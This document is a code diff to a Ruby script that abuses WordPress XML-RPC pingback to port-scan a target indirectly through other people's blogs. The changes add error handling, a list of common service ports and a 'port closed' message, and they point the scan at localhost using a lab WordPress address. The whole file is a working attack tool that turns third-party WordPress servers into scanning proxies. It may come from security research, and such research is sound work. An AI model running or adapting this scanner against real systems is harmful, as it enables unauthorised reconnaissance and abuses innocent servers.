@@ -20,6 +20,9 @@ def get_valid_blog_post(xml_rpcs)
     feed_url = "#{url}/feed/"
     response = Typhoeus::Request.get(feed_url, {:follow_location => true})
     links = response.body.scan(/<link>([^<]+)<\/link>/i)
+    if response.code != 200 or links.nil?
+      raise("No valid blog posts found for xmlrpc #{xml_rpc}")
+    end
     links.each do |link|
       temp_link = link[0]
       # Test if pingback is enabled for extracted link
@@ -38,7 +41,7 @@ def get_valid_blog_post(xml_rpcs)
 end
 
 def generate_requests(hydra, xml_rpcs, target)
-  (20..80).each do |i|
+  %w(21 22 25 53 80 106 110 143 443 3306 8443).each do |i|
     random = (0...8).map{65.+(rand(26)).chr}.join
     xml_rpc_hash = xml_rpcs.sample
     url = "#{target}:#{i}/#{random}/"
@@ -54,20 +57,22 @@ def generate_requests(hydra, xml_rpcs, target)
           puts xml
           puts response.body
         end
+      else
+        puts "Port #{i} is closed"
       end
     end
     hydra.queue(request)
   end
 end
 
-@debug = true
+@debug = false
 hydra = Typhoeus::Hydra.new(:max_concurrency => 10)
-xml_rpcs = %w(http://10.211.55.8/wordpress/xmlrpc.php http://192.168.1.6/wordpress/xmlrpc.php)
-target = "http://www.firefart.net"
+#xml_rpcs = %w(http://10.211.55.8/wordpress/xmlrpc.php http://192.168.1.6/wordpress/xmlrpc.php)
+xml_rpcs = %w(http://10.211.55.8/wordpress/xmlrpc.php)
+target = "http://localhost"
 
 puts "Getting valid blog posts for pingback..."
 hash = get_valid_blog_post(xml_rpcs)
 puts "Starting portscan..."
 generate_requests(hydra, hash, target)
 hydra.run
-
